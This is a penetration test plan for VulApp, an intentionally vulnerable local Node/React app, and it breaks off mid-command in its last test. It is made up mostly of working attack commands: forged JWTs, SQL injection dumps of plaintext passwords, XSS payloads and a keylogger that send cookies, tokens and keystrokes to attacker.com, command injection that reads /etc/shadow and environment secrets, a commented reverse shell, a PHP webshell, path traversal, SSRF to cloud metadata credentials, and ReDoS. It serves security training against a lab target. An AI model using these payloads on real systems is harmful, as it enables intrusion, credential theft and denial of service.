# 🔓 VulApp — Gray-Box Penetration Test Plan

> **Target**: VulApp (Deliberately Vulnerable SaaS Platform)  
> **Test Type**: Gray-Box (partial source knowledge, known credentials & architecture)  
> **Date**: 2026-03-21  
> **Tester**: [Your Name]  
> **Scope**: Full-stack — Backend API (Node.js/Express/SQLite), Frontend (React/Vite)

---

## 📋 Table of Contents

1. [Reconnaissance & Access Data](#1-reconnaissance--access-data)  
2. [Test Environment Setup](#2-test-environment-setup)  
3. [Attack Scenarios with Simulated Data](#3-attack-scenarios-with-simulated-data)  
   - [Phase 1: Authentication & Session Attacks](#phase-1-authentication--session-attacks)
   - [Phase 2: Authorization & Access Control](#phase-2-authorization--access-control)
   - [Phase 3: Injection Attacks](#phase-3-injection-attacks)
   - [Phase 4: File Handling Attacks](#phase-4-file-handling-attacks)
   - [Phase 5: Business Logic Flaws](#phase-5-business-logic-flaws)
   - [Phase 6: Server-Side Attacks](#phase-6-server-side-attacks)
   - [Phase 7: Misconfiguration Exploitation](#phase-7-misconfiguration-exploitation)
4. [Payload Dictionary](#4-payload-dictionary)
5. [Automation Scripts](#5-automation-scripts)
6. [Expected Evidence & Findings Report Template](#6-expected-evidence--findings-report-template)

---

## 1. Reconnaissance & Access Data

### 1.1 Known Architecture (Gray-Box Intel)

| Component        | Technology              | Details                                              |
|------------------|-------------------------|------------------------------------------------------|
| Frontend         | React 18 + Vite         | Served on `http://localhost:5173`                     |
| Backend API      | Node.js + Express 5     | Served on `http://localhost:5001`                     |
| Database         | SQLite 3                | File: `backend/database.sqlite`                      |
| Auth Mechanism   | JWT (jsonwebtoken)      | Secret: `secret123` (hardcoded)                      |
| File Upload      | Multer                  | Destination: `backend/uploads/`, no type validation   |
| HTTP Client      | Axios                   | Used for SSRF-vulnerable outbound requests            |
| CORS Policy      | Wildcard `*`            | No origin restriction                                |
| Container        | Docker Compose          | Backend & Frontend separate services                  |

### 1.2 Known Credentials & Tokens

```
┌──────────────────────────────────────────────────────────────┐
│  TEST ACCOUNT                                                │
│  Email:    test@example.com                                  │
│  Password: 123456                                            │
│  Plan:     free                                              │
│  User ID:  1                                                 │
├──────────────────────────────────────────────────────────────┤
│  JWT SECRET                                                  │
│  Value: secret123                                            │
├──────────────────────────────────────────────────────────────┤
│  DATABASE                                                    │
│  Type: SQLite                                                │
│  Tables: users, projects, files                              │
│  Password storage: PLAINTEXT (no hashing)                    │
└──────────────────────────────────────────────────────────────┘
```

### 1.3 Database Schema (Known from Source)

```sql
-- Users table
CREATE TABLE users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  email TEXT UNIQUE,
  password TEXT,          -- ⚠️ Stored in PLAINTEXT
  plan_type TEXT DEFAULT 'free'
);

-- Projects table
CREATE TABLE projects (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  name TEXT,
  description TEXT,       -- ⚠️ Stored/rendered as raw HTML (XSS)
  owner_id INTEGER,
  is_public BOOLEAN DEFAULT 0
);

-- Files table
CREATE TABLE files (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  filename TEXT,
  filepath TEXT,
  project_id INTEGER,
  owner_id INTEGER
);
```

### 1.4 Full API Endpoint Map

| Method   | Endpoint                          | Auth Required | Known Vuln                  |
|----------|-----------------------------------|---------------|-----------------------------|
| `POST`   | `/api/auth/register`              | No            | No rate limit, User enum    |
| `POST`   | `/api/auth/login`                 | No            | No rate limit, Plaintext pw |
| `GET`    | `/api/auth/profile`               | Yes           | —                           |
| `PUT`    | `/api/auth/profile`               | Yes           | Mass Assignment             |
| `POST`   | `/api/auth/forgot-password`       | No            | Predictable token, leak     |
| `POST`   | `/api/auth/reset-password`        | No            | No expiry, no 1-time use    |
| `GET`    | `/api/projects`                   | Yes           | —                           |
| `GET`    | `/api/projects/:id`               | No*           | IDOR (Read)                 |
| `POST`   | `/api/projects`                   | Yes           | Stored XSS                  |
| `PUT`    | `/api/projects/:id`               | Yes           | IDOR (Update) + XSS         |
| `DELETE` | `/api/projects/:id`               | Yes           | IDOR (Delete)               |
| `GET`    | `/api/projects/search/name?name=` | No            | SQL Injection               |
| `GET`    | `/api/projects/export/csv`        | No            | CSV Injection               |
| `POST`   | `/api/files/upload`               | Yes           | Unrestricted upload         |
| `GET`    | `/api/files/project/:id`          | No            | —                           |
| `GET`    | `/api/files/download?name=`       | No            | Path Traversal              |
| `POST`   | `/api/subscribe`                  | Yes           | Subscription bypass         |
| `GET`    | `/api/debug`                      | No            | Sensitive data exposure     |
| `GET`    | `/api/fetch-url?url=`             | No            | SSRF                        |
| `GET`    | `/api/admin?admin=true`           | No            | Broken access control       |
| `GET`    | `/api/utils/ping?host=`           | No            | Command Injection           |
| `POST`   | `/api/utils/merge`                | No            | Prototype Pollution         |
| `GET`    | `/api/utils/redirect?url=`        | No            | Open Redirect               |
| `GET`    | `/api/utils/lang?lang=`           | No            | Header Injection            |
| `POST`   | `/api/utils/validate-email`       | No            | ReDoS                       |
| `GET`    | `/api/docs`                       | No            | Info disclosure             |

---

## 2. Test Environment Setup

### 2.1 Start the Target

```bash
cd /Users/shaun/workspace/VulApp
docker-compose up --build
```

### 2.2 Verify Services

```bash
# Backend health check
curl -s http://localhost:5001/api/docs | jq .name
# Expected: "VulApp API"

# Frontend health check
curl -s -o /dev/null -w "%{http_code}" http://localhost:5173
# Expected: 200
```

### 2.3 Obtain Valid JWT Token

```bash
# Login and capture token
export TOKEN=$(curl -s -X POST http://localhost:5001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"123456"}' | jq -r '.token')

echo "JWT Token: $TOKEN"
```

### 2.4 Tools Required

| Tool         | Purpose                    | Install                         |
|--------------|----------------------------|---------------------------------|
| `curl`       | HTTP requests              | Built-in on macOS               |
| `jq`         | JSON parsing               | `brew install jq`               |
| `Burp Suite` | Proxy/Intercept/Replay     | [portswigger.net](https://portswigger.net) |
| `sqlmap`     | Automated SQLi             | `brew install sqlmap`           |
| `ffuf`       | Fuzzing                    | `brew install ffuf`             |
| `nikto`      | Web server scanner         | `brew install nikto`            |
| `nuclei`     | Vulnerability scanner      | `brew install nuclei`           |
| `jwt_tool`   | JWT attack toolkit         | `pip install jwt-tool`          |

---

## 3. Attack Scenarios with Simulated Data

---

### Phase 1: Authentication & Session Attacks

#### 🔴 TEST-01: Brute-Force Login (No Rate Limiting)

**Objective**: Confirm absence of rate limiting on login endpoint.

**Simulated Data — Credential Wordlist** (`creds.txt`):
```
test@example.com:password
test@example.com:123456
test@example.com:admin
test@example.com:password123
admin@vulapp.com:admin
admin@vulapp.com:123456
admin@vulapp.com:password
user@vulapp.com:user123
root@vulapp.com:root
root@vulapp.com:toor
```

**Test Command**:
```bash
# Rapid-fire login attempts (should all succeed without being blocked)
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "Attempt $i: %{http_code}\n" \
    -X POST http://localhost:5001/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@example.com","password":"wrong'$i'"}'
done
```

**Expected Result**: All 50 requests return `401` — no `429 Too Many Requests`, no account lockout.

---

#### 🔴 TEST-02: JWT `none` Algorithm Bypass (Forge Any Identity)

**Objective**: Bypass authentication by sending an unsigned JWT with `alg: "none"`.

**Simulated Forged Tokens**:

```bash
# --- Token 1: Impersonate test user as enterprise ---
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"id":1,"email":"test@example.com","plan":"enterprise"}
FORGED_TOKEN_1="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUuY29tIiwicGxhbiI6ImVudGVycHJpc2UifQ."

# --- Token 2: Impersonate non-existent admin ---
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"id":9999,"email":"admin@vulapp.com","plan":"enterprise"}
FORGED_TOKEN_2="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6OTk5OSwiZW1haWwiOiJhZG1pbkB2dWxhcHAuY29tIiwicGxhbiI6ImVudGVycHJpc2UifQ."

# --- Token 3: Impersonate user ID 0 (edge case) ---
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"id":0,"email":"ghost@vulapp.com","plan":"enterprise"}
FORGED_TOKEN_3="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MCwiZW1haWwiOiJnaG9zdEB2dWxhcHAuY29tIiwicGxhbiI6ImVudGVycHJpc2UifQ."
```

**Test Commands**:
```bash
# Use forged token to access profile
curl -H "Authorization: Bearer $FORGED_TOKEN_1" \
  http://localhost:5001/api/auth/profile

# Use forged token to create projects as another user
curl -X POST http://localhost:5001/api/projects \
  -H "Authorization: Bearer $FORGED_TOKEN_2" \
  -H "Content-Type: application/json" \
  -d '{"name":"Hacked Project","description":"Created with forged JWT","is_public":true}'
```

**Expected Result**: Server accepts unsigned token. Profile returns the forged identity.

---

#### 🔴 TEST-03: JWT Secret Cracking / Token Forgery (Known Secret: `secret123`)

**Objective**: Since we know the secret, forge a valid, *signed* JWT.

**Simulated Data — Forged Signed Tokens**:

```bash
# Using Node.js to create a legitimately signed token with known secret
node -e "
const jwt = require('jsonwebtoken');

// Forge an enterprise admin token
const token = jwt.sign(
  { id: 1, email: 'admin@vulapp.com', plan: 'enterprise' },
  'secret123'
);
console.log('Forged signed token:', token);
"
```

**Alternative — Python**:
```python
import jwt
token = jwt.encode(
    {"id": 1, "email": "admin@vulapp.com", "plan": "enterprise"},
    "secret123",
    algorithm="HS256"
)
print(f"Forged token: {token}")
```

---

#### 🔴 TEST-04: User Enumeration via Registration

**Objective**: Identify valid email addresses through different error messages.

**Simulated Data — Email Wordlist** (`emails.txt`):
```
test@example.com
admin@vulapp.com
user@vulapp.com
root@vulapp.com
support@vulapp.com
info@vulapp.com
dev@vulapp.com
ceo@vulapp.com
hr@vulapp.com
finance@vulapp.com
```

**Test Command**:
```bash
# Enumerate existing accounts
while IFS= read -r email; do
  RESPONSE=$(curl -s -X POST http://localhost:5001/api/auth/register \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"test\"}")
  echo "$email => $RESPONSE"
done < emails.txt
```

**Expected Result**:
- Existing account → `409 "An account with this email already exists"`
- New account → `200 "User registered successfully"`

---

#### 🔴 TEST-05: Insecure Password Reset (Predictable Token)

**Objective**: Exploit the predictable base64(email:timestamp) reset token.

**Test Command**:
```bash
# Step 1: Request password reset — token is leaked in response!
curl -s -X POST http://localhost:5001/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com"}'

# The response will include:
# { "debug_token": "dGVzdEBleGFtcGxlLmNvbToxNzExMDk5MjAwMDAw" }
# This is base64("test@example.com:<timestamp>")

# Step 2: Use the leaked token to reset password
curl -s -X POST http://localhost:5001/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"token":"<debug_token_from_step1>","new_password":"hacked123"}'

# Step 3: Login with new password
curl -s -X POST http://localhost:5001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"hacked123"}'
```

**Simulated Data — Bruteforce Token Generation** (if token weren't leaked):
```python
import base64
import time

email = "test@example.com"
# Generate tokens for the last 60 seconds
now = int(time.time() * 1000)
for offset in range(60000):
    ts = now - offset
    token = base64.b64encode(f"{email}:{ts}".encode()).decode()
    # Try each token against /api/auth/reset-password
```

---

### Phase 2: Authorization & Access Control

#### 🔴 TEST-06: IDOR — Read Other Users' Projects

**Objective**: Access project data belonging to other users by iterating IDs.

**Simulated Data — Project ID Enumeration**:
```bash
# Enumerate project IDs 1-20 (no auth required for read!)
for id in $(seq 1 20); do
  RESULT=$(curl -s http://localhost:5001/api/projects/$id)
  echo "Project $id: $RESULT"
done
```

**Expected Result**: Returns project data regardless of ownership.

---

#### 🔴 TEST-07: IDOR — Delete Other Users' Projects

**Objective**: Delete projects belonging to other users.

**Test Command**:
```bash
# First, register a second attacker account
curl -s -X POST http://localhost:5001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"attack123"}'

# Login as attacker
ATTACKER_TOKEN=$(curl -s -X POST http://localhost:5001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"attack123"}' | jq -r '.token')

# Delete project ID 1 (belongs to test@example.com)
curl -X DELETE http://localhost:5001/api/projects/1 \
  -H "Authorization: Bearer $ATTACKER_TOKEN"
```

**Expected Result**: `200 "Project deleted"` — no ownership check performed.

---

#### 🔴 TEST-08: IDOR — Update Other Users' Projects

**Simulated Data — Malicious Update Payload**:
```bash
# Update project ID 1 with attacker's token (inject XSS in description)
curl -X PUT http://localhost:5001/api/projects/1 \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "HACKED by attacker",
    "description": "<img src=x onerror=alert(document.cookie)>",
    "is_public": true
  }'
```

---

#### 🔴 TEST-09: Admin Panel Bypass

**Objective**: Access the admin panel by adding a query parameter.

**Test Commands**:
```bash
# Access admin panel — dumps ALL users with plaintext passwords
curl -s "http://localhost:5001/api/admin?admin=true" | jq .

# Variations to test
curl -s "http://localhost:5001/api/admin?admin=true&format=json"
curl -s "http://localhost:5001/api/admin?admin=True"
curl -s "http://localhost:5001/api/admin?admin=1"
```

**Expected Result**: Full user database dump including emails and plaintext passwords.

---

#### 🔴 TEST-10: Mass Assignment — Privilege Escalation

**Objective**: Escalate privileges by modifying protected fields via profile update.

**Simulated Data — Mass Assignment Payloads**:
```bash
# Payload 1: Upgrade plan to enterprise
curl -X PUT http://localhost:5001/api/auth/profile \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan_type": "enterprise"}'

# Payload 2: Change another user's email
curl -X PUT http://localhost:5001/api/auth/profile \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@vulapp.com"}'

# Payload 3: Set password via mass assignment
curl -X PUT http://localhost:5001/api/auth/profile \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"password": "newpassword", "plan_type": "enterprise"}'

# Payload 4: Attempt to set arbitrary column
curl -X PUT http://localhost:5001/api/auth/profile \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"id": 9999}'
```

---

### Phase 3: Injection Attacks

#### 🔴 TEST-11: SQL Injection — Data Extraction

**Objective**: Extract sensitive data via SQL injection in the search endpoint.

**Simulated Data — SQLi Payloads**:
```bash
# --- Basic Boolean-based ---
# Returns all projects
curl -s "http://localhost:5001/api/projects/search/name?name=' OR '1'='1"

# --- UNION-based: Extract user table ---
# Step 1: Determine column count (projects has 5 columns: id, name, description, owner_id, is_public)
curl -s "http://localhost:5001/api/projects/search/name?name=' UNION SELECT 1,2,3,4,5--"

# Step 2: Extract user emails
curl -s "http://localhost:5001/api/projects/search/name?name=' UNION SELECT 1,email,password,4,5 FROM users--"

# Step 3: Extract all user data
curl -s "http://localhost:5001/api/projects/search/name?name=' UNION SELECT id,email,password,plan_type,0 FROM users--"

# --- SQLite-specific: Extract table names ---
curl -s "http://localhost:5001/api/projects/search/name?name=' UNION SELECT 1,name,sql,4,5 FROM sqlite_master WHERE type='table'--"

# --- Error-based enumeration ---
curl -s "http://localhost:5001/api/projects/search/name?name=' AND 1=CAST((SELECT email FROM users LIMIT 1) AS INT)--"

# --- Time-based blind (SQLite doesn't have SLEEP, but you can use heavy queries) ---
curl -s "http://localhost:5001/api/projects/search/name?name=' AND (SELECT count(*) FROM users WHERE substr(password,1,1)='1')--"
```

**Automated with sqlmap**:
```bash
sqlmap -u "http://localhost:5001/api/projects/search/name?name=test" \
  --dbms=sqlite \
  --dump \
  --batch \
  --level=3 \
  --risk=2
```

---

#### 🔴 TEST-12: Stored XSS — Session Hijacking

**Objective**: Inject persistent JavaScript that executes for all users viewing the project.

**Simulated Data — XSS Payloads**:
```bash
# --- Payload 1: Basic alert ---
curl -X POST http://localhost:5001/api/projects \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "XSS Test 1",
    "description": "<img src=x onerror=alert(1)>",
    "is_public": true
  }'

# --- Payload 2: Cookie stealing ---
curl -X POST http://localhost:5001/api/projects \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "XSS Test 2",
    "description": "<img src=x onerror=\"fetch('"'"'https://attacker.com/?c='"'"'+document.cookie)\">",
    "is_public": true
  }'

# --- Payload 3: Token exfiltration from localStorage ---
curl -X POST http://localhost:5001/api/projects \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "XSS Test 3",
    "description": "<svg onload=\"new Image().src='"'"'https://attacker.com/?t='"'"'+localStorage.getItem('"'"'token'"'"')\">",
    "is_public": true
  }'

# --- Payload 4: DOM manipulation ---
curl -X POST http://localhost:5001/api/projects \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "XSS Test 4",
    "description": "<div onmouseover=\"document.body.innerHTML='"'"'<h1>HACKED</h1>'"'"'\">Hover me</div>",
    "is_public": true
  }'

# --- Payload 5: Keylogger ---
curl -X POST http://localhost:5001/api/projects \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "XSS Test 5",
    "description": "<script>document.onkeypress=function(e){new Image().src=\"https://attacker.com/?k=\"+e.key}</script>",
    "is_public": true
  }'
```

**Note**: The frontend uses `dangerouslySetInnerHTML` on `p.description` in both `Dashboard.jsx` and `ProjectDetails.jsx`, so HTML/JS executes directly.

---

#### 🔴 TEST-13: Command Injection — Remote Code Execution

**Objective**: Execute arbitrary OS commands on the server.

**Simulated Data — Command Injection Payloads**:
```bash
# --- Basic: Append command ---
curl -s "http://localhost:5001/api/utils/ping?host=;id"
curl -s "http://localhost:5001/api/utils/ping?host=;whoami"

# --- Read sensitive files ---
curl -s "http://localhost:5001/api/utils/ping?host=;cat /etc/passwd"
curl -s "http://localhost:5001/api/utils/ping?host=;cat /etc/shadow"
curl -s "http://localhost:5001/api/utils/ping?host=;cat /app/server.js"
curl -s "http://localhost:5001/api/utils/ping?host=;cat /app/middleware/auth.js"

# --- Environment variables (secrets) ---
curl -s "http://localhost:5001/api/utils/ping?host=;env"
curl -s "http://localhost:5001/api/utils/ping?host=;printenv"

# --- Network reconnaissance ---
curl -s "http://localhost:5001/api/utils/ping?host=;ifconfig"
curl -s "http://localhost:5001/api/utils/ping?host=;netstat -tlnp"
curl -s "http://localhost:5001/api/utils/ping?host=;cat /etc/hosts"

# --- Reverse shell (DO NOT use in production — simulation only) ---
# curl -s "http://localhost:5001/api/utils/ping?host=;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"

# --- Using pipe operator ---
curl -s "http://localhost:5001/api/utils/ping?host=127.0.0.1|id"
curl -s "http://localhost:5001/api/utils/ping?host=127.0.0.1|ls -la /app"

# --- Using backticks ---
curl -s "http://localhost:5001/api/utils/ping?host=\`id\`"

# --- Using $() ---
curl -s "http://localhost:5001/api/utils/ping?host=\$(whoami)"

# --- Read the SQLite database ---
curl -s "http://localhost:5001/api/utils/ping?host=;sqlite3 /app/database.sqlite '.dump users'"

# --- List uploaded files ---
curl -s "http://localhost:5001/api/utils/ping?host=;ls -la /app/uploads/"
```

---

#### 🔴 TEST-14: Prototype Pollution

**Objective**: Pollute JavaScript's Object prototype to inject properties into all objects.

**Simulated Data — Prototype Pollution Payloads**:
```bash
# --- Payload 1: Set isAdmin on all objects ---
curl -X POST http://localhost:5001/api/utils/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'

# --- Payload 2: Set role property ---
curl -X POST http://localhost:5001/api/utils/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"role": "superadmin", "permissions": ["read","write","delete","admin"]}}'

# --- Payload 3: Constructor prototype ---
curl -X POST http://localhost:5001/api/utils/merge \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'

# --- Payload 4: Nested pollution ---
curl -X POST http://localhost:5001/api/utils/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"__proto__": {"deepPolluted": true}}}'
```

---

#### 🔴 TEST-15: CSV Injection

**Objective**: Inject spreadsheet formulas into exported CSV data.

**Simulated Data — Malicious Project Names**:
```bash
# Create projects with formula payloads
FORMULAS=(
  '=CMD("calc")'
  '=HYPERLINK("https://evil.com","Click Me")'
  '+cmd|'"'"'/C calc'"'"'!A1'
  '-2+3+cmd|'"'"'/C calc'"'"'!A0'
  '@SUM(1+1)*cmd|'"'"'/C calc'"'"'!A0'
  '=IMPORTXML("https://attacker.com/?data="&A1,"//a")'
  '=IF(1=1,EXEC("open -a Calculator"),"")'
)

for formula in "${FORMULAS[@]}"; do
  curl -s -X POST http://localhost:5001/api/projects \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"$formula\",\"description\":\"CSV injection test\",\"is_public\":true}"
done

# Then export the CSV
curl -s "http://localhost:5001/api/projects/export/csv" -o malicious.csv
cat malicious.csv
```

---

### Phase 4: File Handling Attacks

#### 🔴 TEST-16: Unrestricted File Upload + Execution

**Objective**: Upload malicious files and execute them via direct URL access.

**Simulated Data — Malicious Files to Upload**:

```bash
# --- File 1: HTML with JavaScript (stored XSS via file) ---
cat > /tmp/exploit.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
<h1>XSS via File Upload</h1>
<script>
  // Steal JWT tokens from localStorage
  var token = localStorage.getItem('token');
  document.write('<h2>Stolen Token: ' + token + '</h2>');
  // In real attack: exfiltrate to attacker server
  // new Image().src = 'https://attacker.com/?token=' + token;
</script>
</body>
</html>
EOF

curl -X POST http://localhost:5001/api/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/exploit.html" \
  -F "project_id=1"

# Access at: http://localhost:5001/uploads/exploit.html

# --- File 2: SVG with embedded script ---
cat > /tmp/malicious.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('SVG XSS')">
  <text x="10" y="20">SVG XSS Payload</text>
</svg>
EOF

curl -X POST http://localhost:5001/api/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/malicious.svg" \
  -F "project_id=1"

# --- File 3: Fake PHP webshell (to prove no extension filter) ---
cat > /tmp/shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

curl -X POST http://localhost:5001/api/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/shell.php" \
  -F "project_id=1"

# --- File 4: Large file (no size limit check) ---
dd if=/dev/zero of=/tmp/largefile.bin bs=1M count=100 2>/dev/null
curl -X POST http://localhost:5001/api/files/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/largefile.bin" \
  -F "project_id=1"
```

---

#### 🔴 TEST-17: Path Traversal — Read Arbitrary Files

**Objective**: Read files outside the uploads directory using `../` sequences.

**Simulated Data — Path Traversal Payloads**:
```bash
# --- Read system files ---
curl -s "http://localhost:5001/api/files/download?name=../../etc/passwd"
curl -s "http://localhost:5001/api/files/download?name=../../etc/hosts"
curl -s "http://localhost:5001/api/files/download?name=../../etc/hostname"
curl -s "http://localhost:5001/api/files/download?name=../../proc/self/environ"

# --- Read application source code ---
curl -s "http://localhost:5001/api/files/download?name=../server.js"
curl -s "http://localhost:5001/api/files/download?name=../middleware/auth.js"
curl -s "http://localhost:5001/api/files/download?name=../db.js"
curl -s "http://localhost:5001/api/files/download?name=../package.json"
curl -s "http://localhost:5001/api/files/download?name=../routes/auth.js"
curl -s "http://localhost:5001/api/files/download?name=../routes/debug.js"

# --- Read database file ---
curl -s "http://localhost:5001/api/files/download?name=../database.sqlite" -o stolen.db
# Then inspect: sqlite3 stolen.db ".dump"

# --- URL-encoded traversal (WAF bypass) ---
curl -s "http://localhost:5001/api/files/download?name=..%2F..%2Fetc%2Fpasswd"
curl -s "http://localhost:5001/api/files/download?name=..%252F..%252Fetc%252Fpasswd"

# --- Double encoding ---
curl -s "http://localhost:5001/api/files/download?name=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

---

### Phase 5: Business Logic Flaws

#### 🔴 TEST-18: Subscription Bypass — Free to Enterprise

**Objective**: Bypass payment flow by directly calling the subscribe API.

**Simulated Data — Subscription Payloads**:
```bash
# Upgrade to enterprise — no payment validation
curl -X POST http://localhost:5001/api/subscribe \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan_type": "enterprise"}'

# Try other plan types
curl -X POST http://localhost:5001/api/subscribe \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan_type": "premium"}'

# Try injection in plan_type
curl -X POST http://localhost:5001/api/subscribe \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan_type": "enterprise\"; DROP TABLE users; --"}'

# Verify the upgrade
curl -H "Authorization: Bearer $TOKEN" http://localhost:5001/api/auth/profile
```

---

### Phase 6: Server-Side Attacks

#### 🔴 TEST-19: SSRF — Internal Service Scanning

**Objective**: Use the server as a proxy to access internal services and cloud metadata.

**Simulated Data — SSRF Payloads**:
```bash
# --- Access internal debug endpoint (chain with data exposure) ---
curl -s "http://localhost:5001/api/fetch-url?url=http://localhost:5001/api/debug"

# --- Access admin panel (chain with access control bypass) ---
curl -s "http://localhost:5001/api/fetch-url?url=http://localhost:5001/api/admin?admin=true"

# --- AWS metadata endpoint (if deployed on AWS) ---
curl -s "http://localhost:5001/api/fetch-url?url=http://169.254.169.254/latest/meta-data/"
curl -s "http://localhost:5001/api/fetch-url?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "http://localhost:5001/api/fetch-url?url=http://169.254.169.254/latest/user-data/"

# --- GCP metadata ---
curl -s "http://localhost:5001/api/fetch-url?url=http://metadata.google.internal/computeMetadata/v1/?recursive=true" \
  -H "Metadata-Flavor: Google"

# --- Internal port scanning ---
for port in 22 80 443 3306 5432 6379 8080 8443 27017; do
  RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://localhost:5001/api/fetch-url?url=http://localhost:$port/" 2>&1)
  echo "Port $port: $RESULT"
done

# --- File protocol (may work depending on axios config) ---
curl -s "http://localhost:5001/api/fetch-url?url=file:///etc/passwd"

# --- Internal Docker network scanning ---
curl -s "http://localhost:5001/api/fetch-url?url=http://backend:5001/api/debug"
curl -s "http://localhost:5001/api/fetch-url?url=http://frontend:5173/"
```

---

#### 🔴 TEST-20: Sensitive Data Exposure via Debug Endpoint

**Test Command**:
```bash
curl -s "http://localhost:5001/api/debug" | jq .

# Expected leaked data:
# - JWT secret: "secret123"
# - DB path: /app/database.sqlite
# - All environment variables (process.env)
# - Node.js version, paths, etc.
```

---

#### 🔴 TEST-21: ReDoS (Regex Denial of Service)

**Objective**: Cause CPU exhaustion by exploiting catastrophic regex backtracking.

**Simulated Data — ReDoS Payloads**:
```bash
# Short payload (should be fast)
curl -s -X POST http://localhost:5001/api/utils/validate-email \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com"}'

# Medium payload (noticeable delay)
curl -s -X POST http://localhost:5001/api/utils/validate-email \
  -H "Content-Type: application/json" \
  -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaa!"}'

# Long payload (should hang or timeout — catastrophic backtracking)
curl -s -X POST http://localhost:5001/api/utils/validate-email \
  -H "Content-Type: application/json" \
  -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}'

# Extreme payload (will likely freeze the server)
curl -s --max-time 30 -X POST http://localhost:5001/api/utils/validate-email \
  -H "Content-Type: application/json" \
  -d '{"email":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}'
```

**Expected Result**: Processing time grows exponentially. The regex:
```
/^([a-zA-Z0-9]+)+@([a-zA-Z0-9]+\.)+[a-zA-Z]{2,}$/
```
has nested quantifiers `([a-zA-Z0-9]+)+` which cause O(2^n) backtracking.

---

### Phase 7: Misconfiguration Exploitation

#### 🔴 TEST-22: CORS Wildcard Abuse

**Objective**: Demonstrate cross-origin data theft due to `Access-Control-Allow-Origin: *`.

**Simulated Data — Attacker's Malicious Page** (`cors_exploit.html`):
```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS Exploit PoC</h1>
<script>
  // This would be hosted on attacker.com
  fetch('http://localhost:5001/api/admin?admin=true')
    .then(r => r.json())
    .then(data => {
      document.write('<pre>' + JSON.stringify(data, null, 2) + '</pre>');
      // Exfiltrate to attacker server
      // fetch('https://attacker.com/steal', {method:'POST', body: JSON.stringify(data)});
    });
</script>
</body>
</html>
```

```bash
# Verify CORS headers
curl -s -I -X OPTIONS http://localhost:5001/api/debug \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET"

# Check for Access-Control-Allow-Origin: * in response headers
curl -s -I http://localhost:5001/api/debug -H "Origin: https://evil.com"
```

---

#### 🔴 TEST-23: Open Redirect

**Simulated Data — Redirect Payloads**:
```bash
# Basic external redirect
curl -s -o /dev/null -w "%{redirect_url}" \
  "http://localhost:5001/api/utils/redirect?url=https://evil.com"

# Phishing via redirect
curl -s -o /dev/null -w "%{redirect_url}" \
  "http://localhost:5001/api/utils/redirect?url=https://evil.com/login-page-clone"

# JavaScript protocol
curl -s -o /dev/null -w "%{redirect_url}" \
  "http://localhost:5001/api/utils/redirect?url=javascript:alert(1)"

# Data URI
curl -s -o /dev/null -w "%{redirect_url}" \
